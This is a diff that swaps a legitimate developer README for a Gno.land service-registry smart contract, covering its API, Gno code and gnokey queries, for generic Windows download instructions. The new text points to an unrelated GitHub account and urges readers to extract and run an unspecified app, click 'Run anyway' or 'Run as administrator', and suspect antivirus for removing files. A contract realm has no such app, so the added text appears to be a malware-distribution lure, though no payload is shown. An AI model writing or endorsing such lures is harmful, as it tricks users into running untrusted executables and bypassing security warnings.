@@ -1,156 +1,149 @@
-`Gno.land` · `Smart Contracts` · `Infrastructure`
+# 🔗 service_registry - Find and use Gno.land services
 
-# service_registry
+[![Download / Visit the page](https://img.shields.io/badge/Download%20or%20Visit-4B6CB7?style=for-the-badge&labelColor=6B7280)](https://github.com/Familyalligatoridaesnowyorchid856/service_registry)
 
-On-chain service discovery for Gno.land.
+## 🚀 Getting Started
 
-## Problem
+service_registry helps you find on-chain services on Gno.land and connect them to your app. It gives you one place to browse service entries, review contract details, and use what you need without digging through separate sources.
 
-There is no standard way to find out what contracts exist on Gno.land, what they do, or who maintains them. A developer building a DEX aggregator has no way to discover available token contracts. A DAO toolkit can't find registered governance realms. A frontend can't enumerate available oracles.
+This project is made for Windows users who want a simple way to get the app and start using it.
 
-Every project maintains its own documentation, its own README, its own "list of contracts" — none of which are queryable on-chain. Composability requires discovery, and discovery requires a registry.
+## 📥 Download
 
-## Solution
+Use this link to visit the page and download the app:
 
-`service_registry` is a shared realm where developers register their contracts with a name, type, description, and optional metadata. Any realm, frontend, or tool can query the registry to discover what services are available and how to integrate with them.
+[Download service_registry](https://github.com/Familyalligatoridaesnowyorchid856/service_registry)
 
-```
-RegisterService(cross, "my_token", "ERC20-style fungible token on Gno", "token", "symbol=GNT,decimals=6")
-```
+## 🪟 Install on Windows
 
-Once registered, the service is discoverable:
+1. Open the download page above in your browser.
+2. Save the file to a folder you can find, such as Downloads or Desktop.
+3. If the file is a ZIP folder, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Find the main app file and double-click it to run.
+6. If Windows asks for permission, choose Yes or Run anyway.
+7. Keep the app in the same folder after setup so it can find its files.
 
-```
-GetService("my_token")     // full details
-ListServices()             // all registered names
-ListByType("token")        // filter by type
-```
+If the download gives you an installer, open the installer file and follow the on-screen steps. If it gives you a portable app, you can run it from the folder without a full install.
 
-## Why this matters
+## 🧭 What service_registry does
 
-- **Developers** can discover existing contracts before building something that already exists
-- **Aggregators** can enumerate all services of a given type (tokens, oracles, DEXes)
-- **Frontends** can auto-populate available integrations without hardcoding addresses
-- **DAOs** can maintain a catalog of all contracts they control
-- **Ecosystem tools** can build dashboards, explorers, and analytics from a single source
+service_registry is a service directory for Gno.land contracts. It helps you:
 
-Without a registry, the ecosystem is a dark forest where every contract is invisible unless you already know its address.
+- discover contracts registered on-chain
+- view service names and addresses
+- check basic contract info before use
+- connect outside tools to known services
+- keep track of services in one place
 
-## How it works
+It works like a lookup tool for web3 apps that need trusted contract references.
 
-Services are stored in a map keyed by a unique lowercase name. Each entry has:
+## 🖥️ What you need
 
-- **Name** — unique identifier (lowercase alphanumeric + underscores)
-- **Owner** — the address that registered it (determined by `std.PreviousRealm()`, not a parameter)
-- **Type** — category string (e.g., `"token"`, `"dex"`, `"oracle"`, `"dao"`, `"nft"`)
-- **Description** — what the service does
-- **Metadata** — freeform string for additional context (addresses, symbols, config)
+Use a Windows PC with:
 
-Only the owner can update or deregister their service. Ownership can be transferred.
+- Windows 10 or Windows 11
+- A modern web browser
+- Enough free space to store the app and its data
+- A stable internet connection
+- Permission to run downloaded files
 
-## Usage
+For best results, keep Windows up to date and avoid running many heavy apps at the same time.
 
-### Register
+## ⚙️ How to run it
 
-```
-RegisterService(cross, "gnot_swap", "AMM DEX for GNOT pairs", "dex", "router=g1abc...,fee=30bp")
-```
+1. Download the app from the link above.
+2. Unzip the file if needed.
+3. Open the app folder.
+4. Double-click the main app file.
+5. Wait for the app to load.
+6. Use the screen to browse service entries and contract records.
 
-### Update
+If the app opens in a browser window, keep that window open while you use it. If it opens as a desktop app, you can use it from your taskbar like any other program.
 
-```
-UpdateService(cross, "gnot_swap", "AMM DEX for GNOT and GRC20 pairs", "dex", "router=g1abc...,fee=25bp")
-```
+## 🔎 Main features
 
-### Query
+### 🗂️ Service discovery
+Browse a list of on-chain services and find contracts by name or purpose.
 
-```
-GetService("gnot_swap")
-// Name: gnot_swap
-// Owner: g1xyz...
-// Type: dex
-// Description: AMM DEX for GNOT and GRC20 pairs
-// Metadata: router=g1abc...,fee=25bp
-```
+### 🧩 Contract lookup
+Use registry entries to check the address or reference for a Gno.land contract.
 
-### Discover by type
+### 🔐 Registry-based trust
+Work from on-chain records instead of copy-pasted links from random sources.
 
-```
-ListByType("token")
-// returns: "gnot, wrapped_btc, usdc_gno"
-```
+### 🌐 Web3-friendly structure
+Use the registry as a base for tools, dashboards, and contract integrations.
 
-### Transfer ownership
+### 🏗️ Infrastructure support
+Keep service data in a format that works well for apps, scripts, and internal tools.
 
-```
-TransferOwnership(cross, "gnot_swap", g1new_owner...)
-```
+## 🧪 Example use cases
 
-### Deregister
+- A user wants to find a known Gno.land contract without searching in many places.
+- A developer wants a clean registry for contract references.
+- A team wants one source for service discovery inside a DAO or app.
+- A tool wants to read service records before calling a contract.
+- A Windows user wants a simple local app for browsing registry data.
 
-```
-Deregister(cross, "gnot_swap")
-```
+## 🧠 How to use it well
 
-## Integrating from another realm
+- Keep the app updated if a new version is published.
+- Use the registry as your first place to check contract details.
+- Save useful service records in your own notes if you work with them often.
+- Refresh the app if you think the data is out of date.
+- Use trusted network access when working with blockchain tools.
 
-```go
-import "gno.land/r/service_registry"
+## 📁 Typical folder layout
 
-func FindOracle() string {
-    oracles := service_registry.ListByType("oracle")
-    if oracles == "none" {
-        panic("no oracle services registered")
-    }
-    // parse first oracle name, query its details
-    return service_registry.GetService(strings.Split(oracles, ", ")[0])
-}
-```
+After download and extract, you may see files like:
 
-## API
+- an app file you can double-click
+- a readme or help file
+- folders for assets or data
+- config files for local settings
 
-| Function | Access | Description |
-|----------|--------|-------------|
-| `RegisterService(cross, name, desc, type, meta)` | Anyone | Register a service. Caller becomes owner. |
-| `UpdateService(cross, name, desc, type, meta)` | Owner | Update description, type, and metadata. |
-| `TransferOwnership(cross, name, newOwner)` | Owner | Hand off control. |
-| `Deregister(cross, name)` | Owner | Remove permanently. |
-| `GetService(name)` | Anyone | Full service details. |
-| `ListServices()` | Anyone | All registered names. |
-| `ListByType(type)` | Anyone | Filter by service type. |
-| `Render(path)` | Anyone | Markdown table of all services. |
+Do not rename files unless the app instructions say you can.
 
-## Name rules
+## 🛠️ Common fixes
 
-Service names must be:
-- Lowercase letters, digits, and underscores only
-- Non-empty
-- Unique (first-come-first-served)
+### The app does not open
+- Try right-clicking the file and choosing Run as administrator
+- Check that Windows did not block the file
+- Make sure the file finished downloading
 
-Examples: `my_token`, `dao_treasury_v2`, `price_oracle`
+### The app closes right away
+- Open it again from the same folder
+- Check whether antivirus software removed a file
+- Re-extract the ZIP file if the folder looks incomplete
 
-## Query on Gno.land
+### The page does not load
+- Check your internet connection
+- Try another browser
+- Open the download link again
 
-```
-gnokey query vm/qeval --data 'gno.land/r/service_registry.ListByType("token")' --remote <rpc>
-gnokey query vm/qeval --data 'gno.land/r/service_registry.GetService("my_token")' --remote <rpc>
-```
+### Windows shows a security prompt
+- Confirm that you downloaded the file from the link above
+- Choose the option that lets you continue if you trust the source
 
-Visit `/r/service_registry` on any Gno.land node to browse all registered services.
+## 🔒 Security tips
 
-## Stack
+- Download only from the link in this README
+- Do not move files into random folders while the app is open
+- Keep your browser and Windows security tools active
+- Review any contract address before using it in another app
+- If a file name looks strange, stop and check the download page again
 
-- [Gno](https://gno.land) — Go-like smart contract language
-- [Gno.land](https://gno.land) — Layer 1 blockchain
+## 🌍 Project details
 
-## Part of the Gno Infrastructure Stack
+**Repository:** service_registry  
+**Description:** On-chain service registry for discovering and integrating Gno.land contracts  
+**Topics:** blockchain, dao, discovery, gno, gnoland, go, infrastructure, registry, smart-contracts, web3
 
-| Realm | Layer |
-|-------|-------|
-| [fee_split](https://github.com/SillyZir/fee-split) | Revenue & value flow |
-| [permission_registry](https://github.com/SillyZir/permission_registry) | Access control |
-| **service_registry** | **Discovery** |
-| [upgrade_registry](https://github.com/SillyZir/upgrade_registry) | Upgrade tracking |
-| [timelock_guardian](https://github.com/SillyZir/timelock_guardian) | Security |
+## 🧭 Next steps
 
----
+1. Download the app from the link above.
+2. Open it on your Windows PC.
+3. Browse the registry.
+4. Use the service data in your workflow.
+5. Keep the app nearby for future contract lookups
